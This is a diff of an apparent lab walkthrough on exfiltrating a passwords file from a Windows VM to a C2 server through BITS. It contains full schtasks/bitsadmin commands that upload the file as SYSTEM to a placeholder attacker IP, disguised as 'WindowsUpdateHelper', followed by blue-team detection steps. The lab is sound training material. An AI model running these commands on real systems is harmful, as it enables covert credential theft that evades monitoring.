@@ -332,98 +332,98 @@ sudo ./venv/bin/python3 c2_server.py --port 80
 <img width="939" height="518" alt="image" src="https://github.com/user-attachments/assets/9843fee2-aa9a-4b60-aa14-35b42be3a0ab" />
 
 ## Phase 4: Exfiltration via BITS - Windows VM
+Switch back to the terminal where you are connected to the Windows machine via SSH.
 
-Switch back to the terminal where you are connected to the Windows machine via SSH. We don't need to download any malware; the tool we need (bitsadmin.exe) is already built into the operating system.
+Let's inspect the file we are going to exfiltrate:
 
-- Let's take a look at the passwords.txt file. This is what we are going to exfiltrate:
-
-```PowerShell
+```powershell
 Get-Content C:\Users\victim\Desktop\Labs\LeviathanLab\passwords.txt
 ```
 
-<img width="786" height="149" alt="image" src="https://github.com/user-attachments/assets/90431068-f5ff-4c53-ba03-92e15ab59447" />
+<img width="856" height="136" alt="image" src="https://github.com/user-attachments/assets/4d31aeea-cc56-4d02-9ce6-c361b696d145" />
 
-- We will create a BITS job named "exfil" and configure it as an upload task:
+- BITS requires an interactive session token to perform HTTP transfers. Since our SSH session uses a Network logon token (Logon Type 3), we cannot call bitsadmin directly. Instead, we schedule the exfiltration job to run under SYSTEM, which always holds a valid network token — a chaining technique attackers use in real LotL campaigns.
 
-```PowerShell
-bitsadmin /create /upload exfil
+>[!NOTE]
+>Notice the task name WindowsUpdateHelper. This is deliberate — attackers name scheduled tasks and BITS jobs after legitimate Windows processes to blend in with normal system activity.
+
+- Calculate a start time 2 minutes from now, then create and immediately trigger the task. Replace <UBUNTU_IP> with your actual Ubuntu IP:
+
+```powershell
+$t = (Get-Date).AddMinutes(2).ToString("HH:mm")
+schtasks /create /tn "WindowsUpdateHelper" /sc once /st $t /ru SYSTEM /f /tr "cmd.exe /c bitsadmin /create /upload exfil && bitsadmin /addfile exfil http://<UBUNTU_IP>/upload/passwords.txt C:\Users\victim\Desktop\Labs\LeviathanLab\passwords.txt && bitsadmin /resume exfil"
+schtasks /run /tn "WindowsUpdateHelper"
 ```
 
-<img width="681" height="184" alt="image" src="https://github.com/user-attachments/assets/c255e50d-a699-4bcc-aef0-df2ca8717de4" />
+<img width="853" height="294" alt="image" src="https://github.com/user-attachments/assets/ce4fb753-9f11-4133-8f6a-a3f2a5c50cfd" />
 
+- Wait a few seconds, then confirm the BITS job was created and the transfer was initiated:
 
-- Next, we add our sensitive file to the job. The first argument is the remote attacker URL, and the second is the local path of the file. Make sure to replace <UBUNTU_IP> with your actual Ubuntu IP address:
-
-```PowerShell
-bitsadmin /addfile exfil http://<UBUNTU_IP>/upload/passwords.txt "C:\Users\victim\Desktop\Labs\LeviathanLab\passwords.txt"
+```powershell
+Start-Sleep -Seconds 3
+bitsadmin /list /allusers /verbose
 ```
-
-- Finally, start the transfer. BITS will now take over and quietly push the file to the Ubuntu server.
-
-```PowerShell
-bitsadmin /resume exfil
-```
-
-
 
 ## Phase 5: Verification - Ubuntu VM
-
 Let's verify that the data successfully reached the attacker:
 
-- Go back to your Ubuntu VM and look at the terminal running the C2 server. You should see logs indicating a BITS SESSION CREATED, followed by the chunk transfers, and finally a TRANSFER COMPLETE message.
-
-- Open a web browser on your Ubuntu VM and navigate to the C2 Dashboard:
+- Go back to your Ubuntu VM and look at the terminal running the C2 server. You should see logs indicating a BITS SESSION CREATED, followed by the chunk transfers, and finally a TRANSFER COMPLETE message:
 
 
-```Plaintext
+Open a web browser on your Ubuntu VM and navigate to the C2 Dashboard:
+
+```
 http://127.0.0.1/status
 ```
 
-- You will see a JSON output confirming that passwords.txt has been received.
-
-
+You will see a JSON output confirming that passwords.txt has been received.
 
 ## Phase 6: Blue Team Detection - Windows VM
 
 >[!IMPORTANT]
 >Because the network traffic looked completely legitimate (HTTP traffic from svchost.exe), the firewall did not generate any alerts. As a Blue Teamer, detection relies entirely on Endpoint Analysis.
 
-- In your Windows SSH session, let's hunt for suspicious BITS jobs:
+- In your Windows SSH session, hunt for suspicious BITS jobs. The /allusers flag is critical — without it, you would not see jobs created under SYSTEM:
 
-- List all BITS jobs on the system. The /allusers flag is crucial, as attackers might run jobs under different accounts.
-
-```PowerShell
+```Powershell
 bitsadmin /list /allusers /verbose
 ```
+In the verbose output, look for these Indicators of Compromise:
 
-**What are we looking at?**
-<br></br>
-In the verbose output, you can see massive Indicators of Compromise (IoC):
+- The job name (exfil) — generic names chosen to avoid standing out
+- The remote URL pointing to a non-Microsoft, internal IP address
+- The local file path pointing to a sensitive document (passwords.txt)
+- The job owner is SYSTEM — a standard user exfiltrating data through SYSTEM is itself suspicious
 
-- The job name (exfil).
+Alternatively, query BITS via PowerShell cmdlets:
+```
+Get-BitsTransfer -AllUsers | Select-Object JobId, DisplayName, JobState, OwnerAccount
+```
 
-- The suspicious remote URL pointing to a non-Microsoft IP address.
+>[!NOTE]
+>The OwnerAccount column will show SYSTEM. Combined with a suspicious remote URL, this is a strong signal of abuse. Legitimate BITS jobs owned by SYSTEM point exclusively to Microsoft or vendor update endpoints — never to internal IPs on port 80.
 
-- The local file path pointing to a sensitive document (passwords.txt).
+- A second IoC is the scheduled task itself. List all once-off tasks and inspect recent entries:
 
-Alternatively, modern Windows environments can query this easily via PowerShell cmdlets:
-
-
-```PowerShell
-Get-BitsTransfer -AllUsers | Select-Object JobId, DisplayName, JobState
+```
+schtasks /query /fo LIST /v | findstr /i "windowsupdatehelper"
 ```
 
 ## Cleanup
+We're done! Clean up both the BITS job and the scheduled task.
 
-**We're done!** Let's clean up the environment to prevent the BITS job from lingering in the system queue.
+- The BITS job was created under SYSTEM, so cancelling it directly as victim would be denied. Use the same scheduled task technique:
 
-- On the Windows SSH session, cancel the malicious BITS job to remove it from the system:
-
-```PowerShell
-bitsadmin /cancel exfil
+```
+$t = (Get-Date).AddMinutes(2).ToString("HH:mm")
+schtasks /create /tn "BITSCleanup" /sc once /st $t /ru SYSTEM /f /tr "bitsadmin /cancel exfil"
+schtasks /run /tn "BITSCleanup"
+Start-Sleep -Seconds 2
+schtasks /delete /tn "BITSCleanup" /f
+schtasks /delete /tn "WindowsUpdateHelper" /f
 ```
 
-- On the Ubuntu VM, go to the terminal running the Python C2 server and press CTRL+C to stop it.
+- On the Ubuntu VM, press CTRL+C in the terminal running the C2 server to stop it.
 
 ## Conclusion
 
